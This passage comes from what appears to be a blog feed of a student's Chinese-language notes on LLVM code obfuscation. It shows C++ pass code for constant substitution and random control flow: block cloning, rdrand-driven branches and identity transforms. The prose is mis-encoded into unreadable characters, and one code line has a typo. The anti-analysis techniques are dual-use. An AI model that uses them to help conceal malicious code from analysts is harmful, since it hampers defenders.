y</span></span><br><span class="line">    <span class="type">unsigned</span> randX = <span class="built_in">rand</span>() % MAX_RAND, randY = <span class="built_in">rand</span>() % MAX_RAND;</span><br><span class="line">    <span class="comment">// è®¡ç®— c = val ^ (x &lt;&lt; 5 | y &gt;&gt; 3)</span></span><br><span class="line">    APInt c = val-&gt;<span class="built_in">getValue</span>() ^ (randX &lt;&lt; <span class="number">5</span> | randY &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    ConstantInt *constX = <span class="built_in">CONST</span>(val-&gt;<span class="built_in">getType</span>(), randX);</span><br><span class="line">    ConstantInt *constY = <span class="built_in">CONST</span>(val-&gt;<span class="built_in">getType</span>(), randY);</span><br><span class="line">    ConstantInt *const5 = <span class="built_in">CONST</span>(val-&gt;<span class="built_in">getType</span>(), <span class="number">5</span>);</span><br><span class="line">    ConstantInt *const3 = <span class="built_in">CONST</span>(val-&gt;<span class="built_in">getType</span>(), <span class="number">3</span>);</span><br><span class="line">    ConstantInt *constC = (ConstantInt*)<span class="built_in">CONST</span>(val-&gt;<span class="built_in">getType</span>(), c);</span><br><span class="line">    <span class="comment">// åˆ›å»ºå…¨å±€å˜é‡ x, y</span></span><br><span class="line">    GlobalVariable *x = <span class="keyword">new</span> <span class="built_in">GlobalVariable</span>(M, val-&gt;<span class="built_in">getType</span>(), <span class="literal">false</span>, GlobalValue::PrivateLinkage, constX, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">    GlobalVariable *y = <span class="keyword">new</span> <span class="built_in">GlobalVariable</span>(M, val-&gt;<span class="built_in">getType</span>(), <span class="literal">false</span>, GlobalValue::PrivateLinkage, constY, <span class="string">&quot;y&quot;</span>);</span><br><span class="line">    LoadInst *opX = <span class="keyword">new</span> <span class="built_in">LoadInst</span>(val-&gt;<span class="built_in">getType</span>(), x, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    LoadInst *opY = <span class="keyword">new</span> <span class="built_in">LoadInst</span>(val-&gt;<span class="built_in">getType</span>(), y, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// æ„é€  op = (x &lt;&lt; 5 | y &gt;&gt; 3) ^ c è¡¨è¾¾å¼</span></span><br><span class="line">    BinaryOperator *op1 = BinaryOperator::<span class="built_in">CreateShl</span>(opX, const5, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BinaryOperator *op2 = BinaryOperator::<span class="built_in">CreateLShr</span>(opY, const3, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BinaryOperator *op3 = BinaryOperator::<span class="built_in">CreateOr</span>(op1, op2, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BinaryOperator *op4 = BinaryOperator::<span class="built_in">CreateXor</span>(op3, constC, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ç”¨è¡¨è¾¾å¼ (x &lt;&lt; 5 | y &gt;&gt; 3) ^ c æ›¿æ¢åŸå¸¸é‡æ“ä½œæ•°</span></span><br><span class="line">    BI-&gt;<span class="built_in">setOperand</span>(i, op4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ConstantSubstitution::substitute</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> operandNum = BI-&gt;<span class="built_in">getNumOperands</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; operandNum;i ++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;ConstantInt&gt;(BI-&gt;<span class="built_in">getOperand</span>(i)))&#123;</span><br><span class="line">            <span class="type">int</span> choice = <span class="built_in">rand</span>() % NUMBER_CONST_SUBST;</span><br><span class="line">            <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">linearSubstitute</span>(BI, i);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">bitwiseSubstitute</span>(BI, i);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> ConstantSubstitution::ID = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;ConstantSubstitution&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;csub&quot;</span>, <span class="string">&quot;Replace a constant value with equivalent instructions.&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> hackæŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç æ··æ·† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvmä»£ç æ··æ·†å­¦ä¹ ï¼ˆå…«ï¼‰</title>
      <link href="/posts/8833/"/>
      <url>/posts/8833/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>éšä¾¿å­¦å­¦ llvm ä»£ç æ··æ·†ï¼Œé¡ºä¾¿åšä¸ªæ¯•è®¾ï¼Œæ°´å‡ ç¯‡æ–‡ç« å°±å½“åšåšç¬”è®°</p></blockquote><h1 id="éšæœºæ§åˆ¶æµåŸç†åˆ†æ"><a href="#éšæœºæ§åˆ¶æµåŸç†åˆ†æ" class="headerlink" title="éšæœºæ§åˆ¶æµåŸç†åˆ†æ"></a>éšæœºæ§åˆ¶æµåŸç†åˆ†æ</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>éšæœºæ§åˆ¶æµæ˜¯è™šå‡æ§åˆ¶æµçš„ä¸€ç§å˜ä½“ï¼Œéšæœºæ§åˆ¶æµé€šè¿‡å…‹éš†åŸºæœ¬å—ï¼Œä»¥åŠæ·»åŠ éšæœºè·³è½¬ï¼ˆéšæœºè·³è½¬åˆ°ä¸¤ä¸ªåŠŸèƒ½ç›¸åŒçš„åŸºæœ¬å—ä¸­çš„ä¸€ä¸ªï¼‰æ¥æ··æ·†æ§åˆ¶æµã€‚</p><p>ä¸è™šå‡æ§åˆ¶æµä¸åŒï¼Œéšæœºæ§åˆ¶æµä¸­ä¸å­˜åœ¨ä¸å¯è¾¾åŸºæœ¬å—å’Œä¸é€æ˜è°“è¯ï¼Œå› æ­¤ç”¨äºå»é™¤è™šå‡æ§åˆ¶æµçš„æ‰‹æ®µï¼ˆæ¶ˆé™¤ä¸é€æ˜è°“è¯ã€ç¬¦å·æ‰§è¡Œè·å¾—ä¸å¯è¾¾åŸºæœ¬å—åå»é™¤ï¼‰å¤±æ•ˆã€‚</p><p>éšæœºæ§åˆ¶æµçš„æ§åˆ¶æµå›¾ä¸è™šå‡æ§åˆ¶æµç±»ä¼¼ï¼Œéƒ½å‘ˆé•¿æ¡å½¢ã€‚</p><h2 id="æ··æ·†æ•ˆæœ"><a href="#æ··æ·†æ•ˆæœ" class="headerlink" title="æ··æ·†æ•ˆæœ"></a>æ··æ·†æ•ˆæœ</h2><p>éšæœºçš„è·³è½¬å’Œå†—ä½™çš„ä¸å¯è¾¾åŸºæœ¬å—å¯¼è‡´äº†å¤§é‡çš„åƒåœ¾ä»£ç ï¼Œä¸¥é‡å¹²æ‰°äº†æ”»å‡»è€…çš„åˆ†æï¼Œå¹¶ä¸” <code>rdrand</code> æŒ‡ä»¤å¯ä»¥å¹²æ‰°æŸäº›ç¬¦å·æ‰§è¡Œå¼•æ“ï¼ˆå¦‚ angr ï¼‰çš„åˆ†æã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230227155546896.png" alt="image-20230227155546896"></p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>éšæœºæ§åˆ¶æµåŒæ ·æ˜¯ä»¥åŸºæœ¬å—ä¸ºå•ä½è¿›è¡Œæ··æ·†çš„ï¼Œæ¯ä¸ªåŸºæœ¬å—è¦ç»è¿‡åˆ†è£‚ã€å…‹éš†ã€æ„é€ éšæœºè·³è½¬å’Œæ„é€ è™šå‡éšæœºè·³è½¬å››ä¸ªæ“ä½œã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230227155725537.png" alt="image-20230227155725537"></p><h1 id="éšæœºæ§åˆ¶æµä»£ç å®ç°æ€è·¯"><a href="#éšæœºæ§åˆ¶æµä»£ç å®ç°æ€è·¯" class="headerlink" title="éšæœºæ§åˆ¶æµä»£ç å®ç°æ€è·¯"></a>éšæœºæ§åˆ¶æµä»£ç å®ç°æ€è·¯</h1><h2 id="å®ç°æ­¥éª¤"><a href="#å®ç°æ­¥éª¤" class="headerlink" title="å®ç°æ­¥éª¤"></a>å®ç°æ­¥éª¤</h2><h3 id="ç¬¬ä¸€æ­¥ï¼šåŸºæœ¬å—æ‹†åˆ†"><a href="#ç¬¬ä¸€æ­¥ï¼šåŸºæœ¬å—æ‹†åˆ†" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šåŸºæœ¬å—æ‹†åˆ†"></a>ç¬¬ä¸€æ­¥ï¼šåŸºæœ¬å—æ‹†åˆ†</h3><p>å°†åŸºæœ¬å—æ‹†åˆ†æˆå¤´éƒ¨ã€ä¸­éƒ¨ã€å°¾éƒ¨ä¸‰ä¸ªåŸºæœ¬å—ï¼ŒåŒè™šå‡æ§åˆ¶æµã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230220032135705.png" alt="åŸºæœ¬å—æ‹†åˆ†"></p><p>é€šè¿‡ <code>getFirstNonPHI</code> å‡½æ•°è·å–ç¬¬ä¸€ä¸ªä¸æ˜¯ <code>PHINode</code> çš„æŒ‡ä»¤ï¼Œä»¥è¯¥æŒ‡ä»¤ä¸ºç•Œé™è¿›è¡Œåˆ†å‰²ï¼Œå¾—åˆ° <code>entryBB</code> å’Œ <code>bodyBB</code>ã€‚</p><p>ä»¥ <code>bodyBB</code> çš„ç»ˆç»“æŒ‡ä»¤ä¸ºç•Œé™è¿›è¡Œåˆ†å‰²ï¼Œæœ€ç»ˆå¾—åˆ°å¤´éƒ¨ã€ä¸­éƒ¨å’Œå°¾éƒ¨ä¸‰ä¸ªåŸºæœ¬å—ï¼Œä¹Ÿå°±æ˜¯ <code>entryBB</code>, <code>bodyBB</code> å’Œ <code>endBB</code>ï¼Œå…¶ä¸­å°¾éƒ¨åªæœ‰ç»ˆç»“æŒ‡ä»¤ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç¬¬ä¸€æ­¥ï¼Œæ‹†åˆ†å¾—åˆ° entryBB,bodyBB,endBB</span></span><br><span class="line"><span class="comment">// å…¶ä¸­æ‰€æœ‰çš„ PHI æŒ‡ä»¤éƒ½åœ¨ entryBB(å¦‚æœæœ‰çš„è¯)</span></span><br><span class="line"><span class="comment">// endBB åªåŒ…å«ä¸€æ¡ç»ˆç»“æŒ‡ä»¤</span></span><br><span class="line">BasicBlock *entryBB = BB;</span><br><span class="line">BasicBlock *bodyBB = entryBB-&gt;<span class="built_in">splitBasicBlock</span>(entryBB--<span class="built_in">getFirstNonPHIOrDbgOrLifetime</span>(), <span class="string">&quot;bodyBB&quot;</span>);</span><br><span class="line">BasicBlock *endBB = bodyBB-&gt;<span class="built_in">splitBasicBlock</span>(bodyBB-&gt;<span class="built_in">getTerminator</span>(), <span class="string">&quot;endBB&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="ç¬¬äºŒæ­¥ï¼šåŸºæœ¬å—å…‹éš†"><a href="#ç¬¬äºŒæ­¥ï¼šåŸºæœ¬å—å…‹éš†" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šåŸºæœ¬å—å…‹éš†"></a>ç¬¬äºŒæ­¥ï¼šåŸºæœ¬å—å…‹éš†</h3><p>å°†ä¸­é—´çš„åŸºæœ¬å—è¿›è¡Œå…‹éš†ï¼Œè¿™é‡Œå¯ä»¥é€‰æ‹©å¯¹åŸºæœ¬å—è¿›è¡Œå˜å¼‚ï¼Œä½†ä¸èƒ½æ”¹å˜åŸºæœ¬å—çš„åŠŸèƒ½ã€‚ï¼ˆä¸è™šå‡æ§åˆ¶æµä¸åŒï¼‰</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230220032701809.png" alt="åŸºæœ¬å—å…‹éš†"></p><p><strong>èƒ½ä¸èƒ½æ²¿ç”¨ä¹‹å‰çš„ <code>createCloneBasicBlock</code>å‡½æ•°ï¼Ÿ</strong></p><p>ä¸è™šå‡æ§åˆ¶æµä¸åŒï¼Œéšæœºæ§åˆ¶æµåœ¨å…‹éš†æ—¶ï¼Œè¿˜éœ€è¦ä¿®å¤<strong>é€ƒé€¸å˜é‡</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BasicBlock *cloneBB = <span class="built_in">createCloneBasicBlock</span>(bodyBB);</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨ä¸€ä¸ªåŸºæœ¬å—ä¸­å®šä¹‰çš„å˜é‡ï¼Œå¦‚æœåœ¨å¦ä¸€ä¸ªåŸºæœ¬å—ä¸­è¢«å¼•ç”¨ï¼Œé‚£ä¹ˆè¯¥å˜é‡ç§°ä¸ºé€ƒé€¸å˜é‡ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230227160357638.png" alt="image-20230227160357638"></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BasicBlock* <span class="title">llvm::createCloneBasicBlock</span><span class="params">(BasicBlock *BB)</span></span>&#123;</span><br><span class="line">    <span class="comment">// å…‹éš†ä¹‹å‰å…ˆä¿®å¤æ‰€æœ‰é€ƒé€¸å˜é‡</span></span><br><span class="line">    vector&lt;Instruction*&gt; origReg;</span><br><span class="line">    BasicBlock &amp;entryBB = BB-&gt;<span class="built_in">getParent</span>()-&gt;<span class="built_in">getEntryBlock</span>();</span><br><span class="line">    <span class="keyword">for</span>(Instruction &amp;I : *BB)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="built_in">isa</span>&lt;AllocaInst&gt;(&amp;I) &amp;&amp; I.<span class="built_in">getParent</span>() == &amp;entryBB) </span><br><span class="line">            &amp;&amp; I.<span class="built_in">isUsedOutsideOfBlock</span>(BB))&#123;</span><br><span class="line">            origReg.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(Instruction *I : origReg)&#123;</span><br><span class="line">        <span class="built_in">DemoteRegToStack</span>(*I, entryBB.<span class="built_in">getTerminator</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªæ˜ å°„è¡¨ç±»å‹å˜é‡</span></span><br><span class="line">    ValueToValueMapTy VMap;</span><br><span class="line">    BasicBlock *cloneBB = <span class="built_in">CloneBasicBlock</span>(BB, VMap, <span class="string">&quot;cloneBB&quot;</span>, BB-&gt;<span class="built_in">getParent</span>());</span><br><span class="line">    <span class="comment">// å¯¹å…‹éš†åŸºæœ¬å—çš„å¼•ç”¨è¿›è¡Œä¿®å¤</span></span><br><span class="line">    <span class="keyword">for</span>(Instruction &amp;I : *cloneBB)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; I.<span class="built_in">getNumOperands</span>();i ++)&#123;</span><br><span class="line">            Value *V = <span class="built_in">MapValue</span>(I.<span class="built_in">getOperand</span>(i), VMap);</span><br><span class="line">            <span class="comment">// å¦‚æœæ˜ å°„å‡ºæ¥ä¸ä¸ºç©ºï¼Œï¼ˆæˆåŠŸï¼‰</span></span><br><span class="line">            <span class="keyword">if</span>(V)&#123;</span><br><span class="line">                I.<span class="built_in">setOperand</span>(i, V);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cloneBB;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç¬¬ä¸‰æ­¥ï¼šæ„é€ éšæœºè·³è½¬"><a href="#ç¬¬ä¸‰æ­¥ï¼šæ„é€ éšæœºè·³è½¬" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šæ„é€ éšæœºè·³è½¬"></a>ç¬¬ä¸‰æ­¥ï¼šæ„é€ éšæœºè·³è½¬</h3><p>å°†ç”Ÿæˆéšæœºæ•°çš„æŒ‡ä»¤æ’å…¥åˆ° <code>entryBB</code>ï¼Œå°†ç”Ÿæˆçš„éšæœºæ•°å‘½åä¸º<code>randVar</code>ï¼Œå¹¶åœ¨<code>entryBB</code>åæ’å…¥åŸºäº<code>randVar</code>çš„éšæœºè·³è½¬æŒ‡ä»¤ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230227160538004.png" alt="image-20230227160538004"></p><p>å‘<code>entryBB</code>ä¸­æ’å…¥éšæœºæ•°çš„æŒ‡ä»¤å’Œéšæœºè·³è½¬ï¼Œä½¿å…¶èƒ½å¤Ÿéšæœºè·³è½¬åˆ°<code>bodyBB</code>æˆ–è€…<code>bodyBB</code>çš„å…‹éš†å—ã€‚</p><p>å…¶ä¸­éšæœºæ•°æŒ‡ä»¤å¯ä»¥ä½¿ç”¨ LLVM çš„å†…ç½®å‡½æ•°<code>rdrand</code>ï¼š</p><blockquote><p>å¦‚æœä½¿ç”¨äº†å†…ç½®å‡½æ•°<code>rdrand</code>ï¼Œåœ¨ç”Ÿæˆäº†<code>.ll</code>æ–‡ä»¶åï¼Œéœ€è¦ç”¨<code>llc</code>å·¥å…·é™æ€ç¼–è¯‘ç”ŸæˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ­¤æ—¶éœ€è¦æ·»åŠ <code>-mattr=rdrnd</code>çš„å±æ€§:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llc -filetype=obj -mattr=+rdrnd IR/TestProgram_rcf.ll -o Bin/TestProgram_rcf.o</span><br></pre></td></tr></table></figure><p>å¦åˆ™ä¼šå‡ºç° LLVM ERROR: Cannot select: t74: i64,i32,ch &#x3D; X86ISD::RDRAND t0 é”™è¯¯ã€‚</p><blockquote><p><a href="https://blog.csdn.net/pang241/article/details/78566925">https://blog.csdn.net/pang241/article/details/78566925</a></p></blockquote></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœ¨ entryBB åæ’å…¥éšæœºè·³è½¬ï¼Œä½¿å…¶èƒ½å¤Ÿéšæœºè·³è½¬åˆ°ç¬¬ bodyBB æˆ–å…¶å…‹éš†åŸºæœ¬å— cloneBB</span></span><br><span class="line">entryBB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line"><span class="comment">// è·å– rdrand å‡½æ•°</span></span><br><span class="line">Function *rdrand = Intrinsic::<span class="built_in">getDeclaration</span>(entryBB-&gt;<span class="built_in">getModule</span>(), Intrinsic::x86_rdrand_32);</span><br><span class="line"><span class="comment">// æ–°å»º call æŒ‡ä»¤è°ƒç”¨ rdrand å‡½æ•°ï¼Œè¿”å›ç»“æœæ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œç¬¬ä¸€ä¸ªæˆå‘˜æ˜¯ç”Ÿæˆçš„éšæœºæ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºè¯¥å‡½æ•°æ˜¯å¦è°ƒç”¨æˆåŠŸ</span></span><br><span class="line">CallInst *randVarStruct = CallInst::<span class="built_in">Create</span>(rdrand-&gt;<span class="built_in">getFunctionType</span>(), rdrand, <span class="string">&quot;&quot;</span>, entryBB);</span><br><span class="line"><span class="comment">// é€šè¿‡ rdrand å†…ç½®å‡½æ•°è·å–éšæœºæ•°</span></span><br><span class="line">Value *randVar = ExtractValueInst::<span class="built_in">Create</span>(randVarStruct, <span class="number">0</span>, <span class="string">&quot;&quot;</span>, entryBB);</span><br><span class="line"><span class="built_in">insertRandomBranch</span>(randVar, bodyBB, cloneBB, entryBB);</span><br></pre></td></tr></table></figure><p><code>Intrinsic::getDeclaration(id)</code>æ–¹æ³•ï¼šè·å–å¹¶ä¸”åˆ›å»ºä¸€ä¸ª LLVM å†…ç½®å‡½æ•°ï¼Œè¿™ä¸ª id å¯ä»¥åœ¨ <code>intrinsics.gen</code> ä¸­æ‰¾åˆ°ã€‚è¿™é‡Œè°ƒç”¨ LLVM å†…ç½®çš„ <code>rdrand</code> ç”Ÿæˆéšæœºæ•°çš„å‡½æ•°ã€‚</p><p><code>insertRandomBranch</code>å‡½æ•°ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">RandomControlFlow::insertRandomBranch</span><span class="params">(Value *randVar, BasicBlock *ifTrue, BasicBlock *ifFalse, BasicBlock *insertAfter)</span></span>&#123;</span><br><span class="line">    <span class="comment">// å¯¹éšæœºæ•°è¿›è¡Œç­‰ä»·å˜æ¢</span></span><br><span class="line">    Value *alteredRandVar = <span class="built_in">alterVal</span>(randVar, insertAfter);</span><br><span class="line">    <span class="comment">// and 1 == % 2</span></span><br><span class="line">    Value *randMod2 = BinaryOperator::<span class="built_in">Create</span>(Instruction::And, alteredRandVar, <span class="built_in">CONST_I32</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">    ICmpInst *condition = <span class="keyword">new</span> <span class="built_in">ICmpInst</span>(*insertAfter, ICmpInst::ICMP_EQ, randMod2, <span class="built_in">CONST_I32</span>(<span class="number">1</span>));</span><br><span class="line">    <span class="comment">// è·³è½¬åˆ°ä¸åŒåŸºæœ¬å—</span></span><br><span class="line">    BranchInst::<span class="built_in">Create</span>(ifTrue, ifFalse, condition, insertAfter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹éšæœºå˜é‡çš„æ’ç­‰å˜æ¢ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Value* <span class="title">RandomControlFlow::alterVal</span><span class="params">(Value *startVar,BasicBlock *insertAfter)</span></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> code = <span class="built_in">rand</span>() % <span class="number">3</span>;</span><br><span class="line">    Value *result;</span><br><span class="line">    <span class="keyword">if</span>(code == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">// x = x * (x + 1) - x^2</span></span><br><span class="line">        BinaryOperator *op1 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Add, startVar, <span class="built_in">CONST_I32</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op2 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, startVar, op1, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op3 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, startVar, startVar, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op4 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Sub, op2, op3, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        result = op4;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">// x = 3 * x * (x - 2) - 3 * x^2 + 7 * x</span></span><br><span class="line">        BinaryOperator *op1 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, startVar, <span class="built_in">CONST_I32</span>(<span class="number">3</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op2 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Sub, startVar, <span class="built_in">CONST_I32</span>(<span class="number">2</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op3 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, op1, op2, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op4 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, startVar, startVar, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op5 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, op4, <span class="built_in">CONST_I32</span>(<span class="number">3</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op6 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, startVar, <span class="built_in">CONST_I32</span>(<span class="number">7</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op7 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Sub, op3, op5, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op8 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Add, op6, op7, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        result = op8;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="comment">// x = (x - 1) * (x + 3) - (x + 4) * (x - 3) - 9</span></span><br><span class="line">        BinaryOperator *op1 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Sub, startVar, <span class="built_in">CONST_I32</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op2 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Add, startVar, <span class="built_in">CONST_I32</span>(<span class="number">3</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op3 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Add, startVar, <span class="built_in">CONST_I32</span>(<span class="number">4</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op4 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Sub, startVar, <span class="built_in">CONST_I32</span>(<span class="number">3</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op5 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, op1, op2, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op6 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, op3, op4, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op7 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Sub, op5, op6, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op8 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Sub, op7, <span class="built_in">CONST_I32</span>(<span class="number">9</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        result = op8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç¬¬å››æ­¥ï¼šæ„é€ è™šå‡éšæœºè·³è½¬"><a 